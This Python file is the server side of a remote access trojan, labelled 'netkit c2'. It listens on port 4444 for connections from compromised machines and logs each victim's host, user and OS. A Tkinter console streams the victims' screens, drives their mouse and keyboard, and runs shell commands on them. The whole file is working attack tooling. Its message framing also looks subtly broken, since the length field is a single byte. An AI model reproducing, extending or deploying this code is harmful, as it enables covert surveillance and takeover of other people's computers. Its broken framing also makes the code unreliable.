# netkit/c2_server.py — multi-session RAT console: view screen, drive input, run shell.
import argparse
import io
import json
import socket
import struct
import threading
import tkinter as tk
from PIL import Image, ImageTk

MSG_HELLO, MSG_FRAME, MSG_INPUT, MSG_CMD, MSG_CMD_OUT = 0, 1, 2, 3, 4
CANVAS_W, CANVAS_H = 980, 560

KEYSYM = {
    "Return": "enter", "KP_Enter": "enter", "Escape": "esc", "BackSpace": "backspace",
    "Tab": "tab", "space": "space", "Shift_L": "shift", "Shift_R": "shift",
    "Control_L": "ctrl", "Control_R": "ctrl", "Alt_L": "alt", "Alt_R": "alt",
    "Super_L": "win", "Super_R": "win", "Caps_Lock": "caps_lock", "Delete": "delete",
    "Home": "home", "End": "end", "Prior": "page_up", "Next": "page_down",
    "Up": "up", "Down": "down", "Left": "left", "Right": "right",
    "Print": "print_screen", "Menu": "menu",
}
for _i in range(1, 13):
    KEYSYM["F%d" % _i] = "f%d" % _i


def send_msg(sock, mtype, payload=b""):
    try:
        sock.sendall(struct.pack("<IB", mtype, len(payload)) + payload)
    except OSError:
        pass


class Session:
    def __init__(self, sock, addr):
        self.sock, self.addr = sock, addr
        self.info = {"host": addr[0], "user": "?", "os": "?"}
        self.lock = threading.Lock()
        self.frame = None
        self.frame_seq = 0
        self.console = []
        self.alive = True

    def send(self, mtype, payload=b""):
        send_msg(self.sock, mtype, payload)

    def label(self):
        return "%s / %s  (%s)" % (self.info.get("host"), self.info.get("user"), self.addr[0])


class Server:
    def __init__(self, port):
        self.sessions = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(16)

    def accept_loop(self):
        while True:
            try:
                c, a = self.sock.accept()
            except OSError:
                return
            c.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s = Session(c, a)
            self.sessions.append(s)
            print("[+] session from %s:%d" % a)
            threading.Thread(target=self.read_loop, args=(s,), daemon=True).start()

    def read_loop(self, s):
        def rx(n):
            b = b""
            while len(b) < n:
                ch = s.sock.recv(n - len(b))
                if not ch:
                    raise ConnectionError("closed")
                b += ch
            return b

        try:
            while True:
                mtype, length = struct.unpack("<IB", rx(5))
                payload = rx(length)
                if mtype == MSG_HELLO:
                    s.info.update(json.loads(payload))
                elif mtype == MSG_FRAME:
                    with s.lock:
                        s.frame = payload
                        s.frame_seq += 1
                elif mtype == MSG_CMD_OUT:
                    s.console.append(json.loads(payload).get("out", ""))
        except Exception:
            s.alive = False
            print("[-] session %s dropped" % s.addr[0])


class UI:
    def __init__(self, root, server):
        self.root, self.server = root, server
        self.sel = None
        self.shown_seq = -1
        self.photo = None
        self.img_rect = (0, 0, 1, 1)
        self.last_motion = 0.0
        self.console_idx = {}

        root.title("netkit c2")
        root.configure(bg="#0b1020")
        left = tk.Frame(root, bg="#0b1020")
        left.grid(row=0, column=0, sticky="ns", padx=8, pady=8)
        self.listbox = tk.Listbox(left, width=34, bg="#111827", fg="#e5e7eb",
                                  selectbackground="#2563eb", bd=0, height=28)
        self.listbox.pack(fill="y", expand=True)
        self.listbox.bind("<<ListboxSelect>>", self.on_select)

        right = tk.Frame(root, bg="#0b1020")
        right.grid(row=0, column=1, sticky="nsew", padx=8, pady=8)
        self.canvas = tk.Canvas(right, width=CANVAS_W, height=CANVAS_H,
                                bg="#000000", highlightthickness=0)
        self.canvas.pack()
        self.canvas.bind("<Motion>", self.on_motion)
        self.canvas.bind("<Button-1>", lambda e: self.click(e, 1, True))
        self.canvas.bind("<ButtonRelease-1>", lambda e: self.click(e, 1, False))
        self.canvas.bind("<Button-3>", lambda e: self.click(e, 2, True))
        self.canvas.bind("<ButtonRelease-3>", lambda e: self.click(e, 2, False))
        self.canvas.bind("<MouseWheel>", self.on_wheel)
        self.canvas.bind("<KeyPress>", lambda e: self.on_key(e, True))
        self.canvas.bind("<KeyRelease>", lambda e: self.on_key(e, False))
        self.canvas.focus_set()

        bar = tk.Frame(right, bg="#0b1020")
        bar.pack(fill="x", pady=(6, 0))
        tk.Label(bar, text=">", fg="#22d3ee", bg="#0b1020").pack(side="left")
        self.cmd = tk.Entry(bar, bg="#111827", fg="#e5e7eb", insertbackground="#e5e7eb")
        self.cmd.pack(side="left", fill="x", expand=True, padx=6)
        self.cmd.bind("<Return>", self.run_cmd)

        self.console = tk.Text(right, height=7, bg="#0b1020", fg="#93c5fd", bd=0)
        self.console.pack(fill="x", pady=(6, 0))

        root.after(30, self.pump)
        root.after(500, self.refresh_list)
        root.protocol("WM_DELETE_WINDOW", lambda: root.destroy())

    def refresh_list(self):
        lb = self.listbox
        want = [s.label() for s in self.server.sessions]
        have = list(lb.get(0, "end"))
        if want != have:
            keep = lb.curselection()
            lb.delete(0, "end")
            for w in want:
                lb.insert("end", w)
            if keep and keep[0] < len(want):
                lb.selection_set(keep[0])
        self.root.after(500, self.refresh_list)

    def on_select(self, _ev):
        cur = self.listbox.curselection()
        if not cur:
            return
        idx = cur[0]
        if idx < len(self.server.sessions):
            self.sel = self.server.sessions[idx]
            self.shown_seq = -1
            self.canvas.focus_set()
            self.canvas.delete("all")

    def to_norm(self, ex, ey):
        x, y, w, h = self.img_rect
        nx = max(0.0, min(1.0, (ex - x) / max(1, w)))
        ny = max(0.0, min(1.0, (ey - y) / max(1, h)))
        return nx, ny

    def on_motion(self, e):
        if not self.sel:
            return
        import time

        if time.time() - self.last_motion < 0.016:
            return
        self.last_motion = time.time()
        nx, ny = self.to_norm(e.x, e.y)
        self.sel.send(MSG_INPUT, json.dumps({"t": "m", "x": nx, "y": ny}).encode())

    def click(self, e, btn, down):
        if not self.sel:
            return
        nx, ny = self.to_norm(e.x, e.y)
        self.sel.send(MSG_INPUT, json.dumps(
            {"t": "c", "x": nx, "y": ny, "b": btn, "d": 1 if down else 0}).encode())

    def on_wheel(self, e):
        if not self.sel:
            return
        nx, ny = self.to_norm(e.x, e.y)
        self.sel.send(MSG_INPUT, json.dumps(
            {"t": "s", "d": 1 if e.delta > 0 else -1, "x": nx, "y": ny}).encode())

    def on_key(self, e, down):
        if not self.sel:
            return
        ks = e.keysym
        if ks in KEYSYM:
            key = KEYSYM[ks]
        elif e.char and ord(e.char) >= 32:
            key = e.char
        elif len(ks) == 1 and ks.isalpha():
            key = ks.lower()
        else:
            return
        self.sel.send(MSG_INPUT, json.dumps(
            {"t": "k", "k": key, "d": 1 if down else 0}).encode())

    def run_cmd(self, _ev):
        if not self.sel:
            return
        text = self.cmd.get().strip()
        if not text:
            return
        self.sel.send(MSG_CMD, text.encode())
        self.console.insert("end", "> %s\n" % text)
        self.cmd.delete(0, "end")

    def pump(self):
        s = self.sel
        if s and s.alive and s.frame_seq != self.shown_seq:
            with s.lock:
                data, seq = s.frame, s.frame_seq
            self.shown_seq = seq
            try:
                img = Image.open(io.BytesIO(data)).convert("RGB")
            except Exception:
                img = None
            if img:
                ratio = min(CANVAS_W / img.width, CANVAS_H / img.height)
                w, h = int(img.width * ratio), int(img.height * ratio)
                ox, oy = (CANVAS_W - w) // 2, (CANVAS_H - h) // 2
                self.img_rect = (ox, oy, w, h)
                resized = img.resize((w, h), Image.BILINEAR)
                self.photo = ImageTk.PhotoImage(resized)
                self.canvas.delete("frame")
                self.canvas.create_image(ox, oy, anchor="nw", image=self.photo, tags="frame")
        if s:
            seen = self.console_idx.get(id(s), 0)
            while seen < len(s.console):
                self.console.insert("end", s.console[seen] + "\n")
                seen += 1
            self.console_idx[id(s)] = seen
            self.console.see("end")
        self.root.after(30, self.pump)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4444)
    args = ap.parse_args()
    server = Server(args.port)
    threading.Thread(target=server.accept_loop, daemon=True).start()
    print("[c2] listening on 0.0.0.0:%d" % args.port)
    root = tk.Tk()
    UI(root, server)
    root.mainloop()


if __name__ == "__main__":
    main()
